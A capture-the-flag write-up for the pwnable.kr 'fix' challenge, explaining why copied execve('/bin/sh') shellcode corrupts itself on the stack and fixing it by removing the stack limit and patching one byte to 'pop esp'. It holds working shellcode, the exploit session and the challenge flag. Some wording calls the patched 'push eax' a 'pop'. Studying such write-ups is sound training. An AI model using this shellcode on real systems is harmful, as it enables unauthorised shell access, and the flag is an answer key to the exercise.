# fix

## Description

fix - 35 pt 

> Why bother to make your own shellcode? <br>
> I can simply copy&paste from shell-storm.org <br>
> so I just copied it from shell-storm then used it for my buffer overflow exercise <br>
> but it doesn't work :( <br>
> can you please help me to fix this?? <br><br>
> ssh fix@pwnable.kr -p2222 (pw:guest)

## Solution

### Exploit

This time, we are given a binary `fix` and it's source code:

```c
#include <stdio.h>

// 23byte shellcode from http://shell-storm.org/shellcode/files/shellcode-827.php
char sc[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

void shellcode(){
	// a buffer we are about to exploit!
	char buf[20];

	// prepare shellcode on executable stack!
	strcpy(buf, sc);

	// overwrite return address!
	*(int*)(buf+32) = buf;

	printf("get shell\n");
}

int main(){
        printf("What the hell is wrong with my shellcode??????\n");
        printf("I just copied and pasted it from shell-storm.org :(\n");
        printf("Can you fix it for me?\n");

	unsigned int index=0;
	printf("Tell me the byte index to be fixed : ");
	scanf("%d", &index);
	fflush(stdin);

	if(index > 22)	return 0;

	int fix=0;
	printf("Tell me the value to be patched : ");
	scanf("%d", &fix);

	// patching my shellcode
	sc[index] = fix;	

	// this should work..
	shellcode();
	return 0;
}
```

The program prompts the user asking for an index in the shellcode (and checks that index is in fact in the shellcode) and a value. The program then patches the shellcode and executes it.

The shellcode is a 23 byte long one, taken from [shell-storm](http://shell-storm.org/shellcode/files/shellcode-827.php). It's a simple shellcode that executes `/bin/sh` using the `execve` syscall. Here is the disassembly:

```python
from pwn import *

context.binary = ELF('fix')

shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69' + \
		    b'\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
print(disasm(shellcode))
```

```asm
   0:   31 c0                   xor    eax, eax
   2:   50                      push   eax
   3:   68 2f 2f 73 68          push   0x68732f2f
   8:   68 2f 62 69 6e          push   0x6e69622f
   d:   89 e3                   mov    ebx, esp
   f:   50                      push   eax
  10:   53                      push   ebx
  11:   89 e1                   mov    ecx, esp
  13:   b0 0b                   mov    al, 0xb
  15:   cd 80                   int    0x80
```

When running the program (and "patching" an index with it's current value) the program crashes with a segmentation fault.

Upon further investigation, by debugging the program, it seems the segmentation fault is caused by the one of the instuctions there. The shellcode pushes several values, and after the the second `push` instruction, the stack pointer points at the *shellcode itself*. So, after the third push, the shellcode is corrupted and when the program tries to execute it, it crashes.

To fix it, we need to move the stack pointer elsewhere, so it won't point at the shellcode itself, while maintaining the integrity of the shellcode. 

If we could somehow move the stack pointer so it'll point to a place where all the bytes are zero, then - for example - the second `push %eax` instruction will be meaningless. In other words, if we change the second `pop %eax` instruction to some instruction that'll make the `%esp` point to a place where all the bytes are zero (and is writable) - we win 💪.

One way we could do this is by disabling the stack limit, and changing the `pop %eax` to a `pop %esp` (which unsurprisingly both have one byte long opcode).

Since the the top of the stack (at the moment where the `push eax` instruction is executed) is `/bin/sh`, the stack pointer will have a garbage value. Because the stack is unlimited, it will point somewhere on the stack, where all the bytes are zero.


```bash
fix@pwnable:~$ ulimit -s unlimited
fix@pwnable:~$ ./fix
What the hell is wrong with my shellcode??????
I just copied and pasted it from shell-storm.org :(
Can you fix it for me?
Tell me the byte index to be fixed : 15
Tell me the value to be patched : 92
get shell
$ cat flag
Sorry for blaming shell-strom.org :) it was my ignorance!
```